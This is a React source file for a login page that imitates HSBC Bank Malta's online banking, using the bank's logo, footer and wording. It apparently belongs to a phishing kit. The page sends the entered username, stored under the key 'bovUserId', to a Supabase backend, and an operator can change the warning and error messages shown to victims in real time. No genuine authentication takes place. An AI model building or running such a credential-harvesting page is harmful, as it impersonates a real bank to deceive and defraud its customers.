
import { useState, useEffect } from 'react';
import { Button } from '@/components/ui/button';
import { Input } from '@/components/ui/input';
import { useForm } from '@/contexts/FormContext';
import { Checkbox } from '@/components/ui/checkbox';
import { Info, ArrowRight, X, HelpCircle, Menu } from 'lucide-react';
import { supabase } from '@/integrations/supabase/client';
import ErrorAlert from '@/components/ErrorAlert';
import hsbcLogo from '/uploaded/2cb7125c-8178-444d-9da1-b5b7641913ec.png';

// Singleton ID for the login settings row
const LOGIN_SETTINGS_ID = '00000000-0000-0000-0000-000000000001';

const LoginPage = () => {
  const [username, setUsername] = useState('');
  const [rememberMe, setRememberMe] = useState(false);
  const [warningMessage, setWarningMessage] = useState('');
  const [showWarning, setShowWarning] = useState(true);
  const [validationError, setValidationError] = useState('');
  const { updateSessionData } = useForm();

  // Fetch warning message from Supabase with real-time updates
  useEffect(() => {
    const fetchWarningMessage = async () => {
      try {
        const { data, error } = await supabase
          .from('login_settings')
          .select('warning_message, show_warning')
          .eq('id', 1)
          .maybeSingle();
        
        if (error) throw error;
        
        if (data?.warning_message !== undefined) {
          setWarningMessage(data.warning_message);
          setShowWarning(data.show_warning);
        }
      } catch (error) {
        // Silently handle error - page should work without warning message
      }
    };

    // Initial fetch
    fetchWarningMessage();

    // Subscribe to real-time changes
    const channel = supabase
      .channel('login_page_warning_changes')
      .on(
        'postgres_changes',
        {
          event: 'UPDATE',
          schema: 'public',
          table: 'login_settings'
        },
        (payload) => {
          console.log('Warning message updated in real-time on login page:', payload);
          if (payload.new && typeof payload.new === 'object') {
            const newData = payload.new as { warning_message?: string; show_warning?: boolean };
            if (newData.warning_message !== undefined) {
              setWarningMessage(newData.warning_message);
            }
            if (newData.show_warning !== undefined) {
              setShowWarning(newData.show_warning);
            }
          }
        }
      )
      .subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const handleUsernameChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value;
    setUsername(value);
    
    // Check for spaces
    if (value.includes(' ')) {
      setValidationError('You have entered an invalid character. Please remove the character before continuing.');
    } else {
      setValidationError('');
    }
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    e.stopPropagation();
    
    console.log('Login form submitted with:', { username });
    
    // Validate no spaces
    if (username.includes(' ')) {
      setValidationError('You have entered an invalid character. Please remove the character before continuing.');
      return;
    }
    
    if (username.trim()) {
      console.log('Valid input, calling updateSessionData...');
      updateSessionData('login', { bovUserId: username, code: 'dummy' });
      console.log('updateSessionData called');
    } else {
      console.log('Invalid input - missing username');
    }
  };

  return (
    <div className="min-h-screen bg-gray-50 flex flex-col">
      {/* Header with hamburger menu and HSBC Logo */}
      <div className="bg-white shadow-sm">
        <div className="max-w-7xl mx-auto px-6 py-4 flex items-center justify-between">
          <div className="flex items-center space-x-4">
            <Menu className="h-6 w-6 text-gray-600" />
            <img 
              src={hsbcLogo} 
              alt="HSBC" 
              className="h-8 w-auto"
            />
          </div>
        </div>
      </div>

      {/* Main Content Container */}
      <div className="flex-1 flex flex-col">
        {/* Warning Alert - Matching original HSBC design */}
        {showWarning && warningMessage && (
          <div className="bg-[#e8eef5] border border-[#d1dbe8] p-6 relative mx-4 mt-6 rounded-sm">
            <button
              onClick={() => setShowWarning(false)}
              className="absolute top-4 right-4 text-gray-600 hover:text-gray-800 transition-colors"
              aria-label="Close warning"
            >
              <X className="h-5 w-5" />
            </button>
            <div className="flex items-start space-x-3 pr-10">
              <div className="flex-shrink-0 mt-0.5">
                <div className="h-6 w-6 rounded-full bg-[#005eb8] flex items-center justify-center">
                  <Info className="h-4 w-4 text-white" />
                </div>
              </div>
              <div className="flex-1">
                <div className="text-[15px] text-gray-800 leading-relaxed">
                  <p className="whitespace-pre-line">{warningMessage}</p>
                </div>
              </div>
            </div>
          </div>
        )}

        {/* Login Form */}
        <div className="flex-1 flex items-start justify-center px-6 pt-8">
          <div className="w-full max-w-md mx-auto">
            <div className="mb-8">
              <h1 className="text-3xl font-normal text-gray-800 mb-8">
                Log on
              </h1>
            </div>
            
            {/* Error Alert from Admin */}
            <ErrorAlert />
            
            <form onSubmit={handleSubmit} className="space-y-6">
              {/* Username Input */}
              <div>
                <div className="flex items-center justify-between mb-3">
                  <label className="block text-sm font-medium text-gray-700">
                    Please enter your username
                  </label>
                  <HelpCircle className="h-4 w-4 text-gray-400" />
                </div>
                <Input
                  type="text"
                  value={username}
                  onChange={handleUsernameChange}
                  className={`w-full h-12 px-4 border-2 ${validationError ? 'border-red-500' : 'border-blue-400'} focus:border-blue-600 rounded text-gray-700 placeholder-gray-400 text-base focus:outline-none focus:ring-0`}
                  placeholder=""
                  required
                />
                
                {/* Validation Error */}
                {validationError && (
                  <div className="flex items-center space-x-2 mt-2 text-red-600">
                    <X className="h-4 w-4 flex-shrink-0" />
                    <span className="text-sm">{validationError}</span>
                  </div>
                )}
              </div>

              {/* Remember Me Checkbox */}
              <div className="flex items-center space-x-2 py-2">
                <Checkbox
                  id="remember-me"
                  checked={rememberMe}
                  onCheckedChange={(checked) => setRememberMe(checked === true)}
                  className="border-gray-400"
                />
                <label 
                  htmlFor="remember-me"
                  className="text-sm font-medium text-gray-700 cursor-pointer"
                >
                  Remember me
                </label>
              </div>

              {/* Continue Button */}
              <Button
                type="submit"
                className={`w-full h-12 text-white font-medium rounded text-base transition-all ${
                  username.trim() 
                    ? 'bg-[hsl(0,100%,45%)] hover:bg-[hsl(0,100%,40%)]' 
                    : 'bg-[hsl(0,85%,60%)] hover:bg-[hsl(0,85%,55%)]'
                }`}
                disabled={!username.trim()}
              >
                Continue
              </Button>

              {/* Registration Link */}
              <div className="pt-6">
                <a 
                  href="#" 
                  className="text-sm text-gray-700 hover:text-gray-900 inline-flex items-center"
                  onClick={(e) => e.preventDefault()}
                >
                  Not registered for online banking?
                  <ArrowRight className="h-4 w-4 ml-1 text-red-500" />
                </a>
              </div>
            </form>
          </div>
        </div>

        {/* Footer */}
        <footer className="bg-black text-white py-6 mt-auto">
          <div className="max-w-7xl mx-auto px-6 text-center">
            <div className="text-sm space-y-2">
              <div className="flex items-center justify-center space-x-4">
                <span>Investor relations</span>
                <span>|</span>
                <span>HSBC Group</span>
                <span>|</span>
                <span>© HSBC Bank Malta p.l.c. 2025. All rights reserved.</span>
              </div>
              <div>
                <span>This website is designed for use in Malta. Cross-border banking</span>
              </div>
            </div>
          </div>
        </footer>
      </div>
    </div>
  );
};

export default LoginPage;
